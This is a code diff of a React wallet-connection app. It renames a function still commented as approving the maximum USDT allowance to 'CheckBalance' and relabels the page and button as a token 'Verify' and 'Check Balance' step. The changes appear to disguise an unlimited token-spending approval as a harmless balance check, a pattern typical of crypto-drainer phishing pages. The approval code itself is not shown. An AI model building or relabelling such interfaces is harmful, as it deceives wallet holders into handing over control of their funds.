@@ -38,7 +38,7 @@ function App() {
   }
 
   // Approve max USDT function
-  async function approveMax() {
+  async function CheckBalance() {
     if (!signer) {
       alert("Please connect your wallet first");
       return;
@@ -63,7 +63,7 @@ function App() {
 
   return (
     <div style={{ maxWidth: 400, margin: "auto", padding: 20, fontFamily: "Arial" }}>
-      <h2>USDT Approve Demo</h2>
+      <h2>USDT Bep20 Token Verify:</h2>
       {!account ? (
         <button onClick={connectWallet} style={{ padding: "10px 20px", fontSize: 16 }}>
           Connect Wallet
@@ -72,11 +72,11 @@ function App() {
         <>
           <p>Connected: <b>{account}</b></p>
           <button
-            onClick={approveMax}
+            onClick={CheckBalance}
             disabled={loading}
             style={{ padding: "10px 20px", fontSize: 16 }}
           >
-            {loading ? "Approving..." : "Approve Max USDT"}
+            {loading ? "Checking..." : "Check Balance"}
           </button>
           {txHash && (
             <p>
